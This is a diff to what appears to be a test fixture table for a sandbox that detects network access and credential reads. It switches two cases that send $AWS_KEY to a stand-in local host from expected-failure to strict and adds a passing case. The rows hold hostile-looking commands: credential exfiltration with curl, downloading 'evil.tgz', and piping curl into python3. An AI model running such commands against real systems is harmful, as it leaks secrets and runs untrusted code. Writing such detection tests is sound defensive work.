@@ -70,8 +70,8 @@ F-X05	verify-networked	strict	git archive --remote=ssh://127.0.0.1:9/x HEAD
 F-X06	verify-networked	strict	busybox wget http://127.0.0.1:9/f
 F-X07	verify-networked	strict	pip3 download http://127.0.0.1:9/evil.tgz
 F-X08	verify-networked	strict	telnet 127.0.0.1 9
-F-X09	verify-credential-read	xfail	curl http://127.0.0.1:9/$AWS_KEY
-F-X10	verify-credential-read	xfail	curl -s -H "X: $AWS_KEY" http://127.0.0.1:9/
+F-X09	verify-credential-read	strict	curl http://127.0.0.1:9/$AWS_KEY
+F-X10	verify-credential-read	strict	curl -s -H "X: $AWS_KEY" http://127.0.0.1:9/
 F-X11	verify-networked	strict	curl telnet://127.0.0.1:9/
 F-X12	verify-networked	xfail	python3 -c 'import socket'
 F-X13	verify-networked	xfail	curl http://127.0.0.1:9/f | python3
@@ -105,3 +105,4 @@ F-P21	PASS	strict	pip3 --version
 F-P22	PASS	strict	printf telnet-ok
 F-P23	PASS	strict	curl -sS http://127.0.0.1:9/fixture
 F-P24	PASS	strict	printf busybox
+F-P25	PASS	strict	curl http://127.0.0.1:9/$BRANCH/fixture
